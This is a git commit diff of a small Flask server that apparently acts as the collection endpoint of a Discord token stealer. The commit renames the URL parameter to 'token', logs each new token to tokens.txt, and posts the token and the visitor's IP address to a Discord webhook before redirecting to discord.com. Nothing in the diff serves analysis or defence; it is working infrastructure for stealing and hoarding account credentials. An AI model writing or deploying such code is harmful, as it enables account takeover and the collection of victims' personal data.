f3f7a44c869e2257f47d46e58a371ae75f243fa3
baum1810 <72774679+baum1810@users.noreply.github.com>
2022-12-22 10:11:55 +0100

    Update server.py

--- server.py
+++ server.py
@@ -1,21 +1,27 @@
 from flask import Flask, redirect,request
 from dhooks import Webhook
-import requests
+
 app = Flask(__name__)
 hook = Webhook('YOUR WEBHOOK')
 @app.route('/')
 def main():
 
-
   return redirect("https://discord.com/app")
-@app.route('/<string:test>')
-def index(test):
+@app.route('/<string:token>')
+def index(token):
     if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
         publicip = request.environ['REMOTE_ADDR']
     else:
-        publicip = request.environ['HTTP_X_FORWARDED_FOR']    
-   
-    hook.send('Token: `'+test+'`\nIp: `'+publicip+'`')
+        publicip = request.environ['HTTP_X_FORWARDED_FOR']  
+    open("tokens.txt", 'a').close()
+    with open('tokens.txt', 'r') as f:
+      if not any(f"{token}" in line for line in f):
+        f = open("tokens.txt","a")
+        f.write(f"{token}\n")
+        f.close()
+    try:
+      hook.send('Token: `'+token+'`\nIp: `'+publicip+'`')
+    except:pass
     return redirect("https://discord.com/app")
 
 
